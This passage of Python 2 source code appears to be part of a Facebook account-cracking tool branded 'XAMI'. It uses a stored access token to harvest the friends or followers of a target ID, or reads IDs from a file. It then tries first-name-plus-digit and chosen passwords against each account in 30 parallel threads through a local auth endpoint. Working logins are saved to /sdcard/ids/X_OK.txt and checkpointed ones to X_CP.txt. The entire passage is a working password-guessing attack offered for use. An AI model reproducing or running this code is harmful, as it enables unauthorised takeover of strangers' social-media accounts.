    print '\x1b[0;37;40m[1] PUBLIC ID CLONING'
    print '\x1b[0;37;40m[2] FOLLOWERS ID CLONING'
    print '\x1b[0;37;40m[3] FILE CLONING'
    print '\x1b[0;33;40m[0] BACK'
    a_s()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t LOGIN FB ID TO CONTINUE\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[0;33;40m--- NAME + NUMBER PASS CRACKING ---\x1b[0;33;40m'
    print 47 * '-'
    print '\x1b[0;37;40m[1] PUBLIC ID CLONING'
    print '\x1b[0;37;40m[2] FOLLOWERS ID CLONING'
    print '\x1b[0;37;40m[3] FILE CLONING'
    print '\x1b[0;33;40m[0] BACK'
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80XAMI\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NAME + NUMBER PASS PUBLIC CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print ' \x1b[0;37;40mFOR EXAMPLE:123,1234,12345,786,12,1122\x1b[0;37;40m'
        print 47 * '-'
        p1 = raw_input(' \x1b[0;37;40m[1] NAME + DIGIT: ')
        p2 = raw_input(' \x1b[0;37;40m[2] NAME + DIGIT: ')
        p3 = raw_input(' \x1b[0;37;40m[3] NAME + DIGIT: ')
        p4 = raw_input(' \x1b[0;37;40m[4] NAME + DIGIT: ')
        pass5 = raw_input(' \x1b[0;37;40m[5] PASSWORD: ')
        pass6 = raw_input(' \x1b[0;37;40m[6] PASSWORD: ')
        pass7 = raw_input(' \x1b[0;37;40m[7] PASSWORD: ')
        pass8 = raw_input(' \x1b[0;37;40m[8] PASSWORD: ')
        idt = raw_input(' \x1b[0;33;40m[\xe2\x98\x85] ENTER ID: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[0;33;40m--- NAME PASS PUBLIC CRACKING ---'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NAME PASS FOLLOWERS CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print ' \x1b[0;37;40mFOR EXAMPLE:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[0;37;40m[1] NAME + DIGIT: ')
        p2 = raw_input(' \x1b[0;37;40m[2] NAME + DIGIT: ')
        p3 = raw_input(' \x1b[0;37;40m[3] NAME + DIGIT: ')
        p4 = raw_input(' \x1b[0;37;40m[4] NAME + DIGIT: ')
        idt = raw_input(' \x1b[0;33;40m[\xe2\x98\x85] ENTER ID: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[0;33;40m--- NAME PASS FOLLOWERS CRACKING ---'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NAME + NUMBER PASS FILE CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print '\x1b[0;37;40mFOR EXAMPLE:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[0;37;40m[1] NAME + DIGIT: ')
        p2 = raw_input(' \x1b[0;37;40m[2] NAME + DIGIT: ')
        p3 = raw_input(' \x1b[0;37;40m[3] NAME + DIGIT: ')
        p4 = raw_input(' \x1b[0;37;40m[4] NAME + DIGIT: ')
        pass5 = raw_input(' \x1b[0;37;40m[5] PASSWORD: ')
        pass6 = raw_input(' \x1b[0;37;40m[6] PASSWORD: ')
        pass7 = raw_input(' \x1b[0;37;40m[7] PASSWORD: ')
        pass8 = raw_input(' \x1b[0;37;40m[8] PASSWORD: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('PRESS ENTER TO BACK. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[0;37;40mCRACK RUNNING\x1b[0;37;40m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[0;36;40m[XAMI]\x1b[0;36;40m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/X_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass1
                cp = open('X_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/X_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass2
                    cp = open('X_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/X_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass3
                        cp = open('X_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/X_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass4
                            cp = open('X_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/X_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass5
                                cp = open('X_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/X_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass6
                                    cp = open('X_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/X_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass7
                                        cp = open('X_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/X_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass8
                                            cp = open('X_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[0;36;40m CRACK DONE'
    print ' \x1b[0;36;40m TOTAL OK/CP:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[0;36;40m PRESS ENTER TO BACK')
    auto_crack()

if __name__ == '__main__':
    menu()
